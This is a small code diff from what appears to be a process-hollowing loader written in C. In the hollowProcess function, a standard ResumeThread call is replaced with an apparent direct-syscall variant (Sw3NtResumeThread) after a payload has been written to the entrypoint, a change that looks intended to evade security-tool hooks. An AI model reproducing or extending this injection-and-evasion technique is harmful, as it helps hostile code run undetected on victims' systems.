@@ -133,7 +133,10 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, IN PVOID pPayload, SIZE_T sPayload) {
     //results =  (Pi.hProcess, (LPVOID)test, truePayload, sizeof(truePayload), &bytesRW);
     printf("WRote @ Address of entrypoint offset: 0x%p\n", test);
     getchar();
-    ResumeThread(Pi.hThread);
+    
+    //ResumeThread(Pi.hThread);
+    PULONG suspendCount;
+    Sw3NtResumeThread(Pi.hThread, &suspendCount);
 }
 
 int main() {
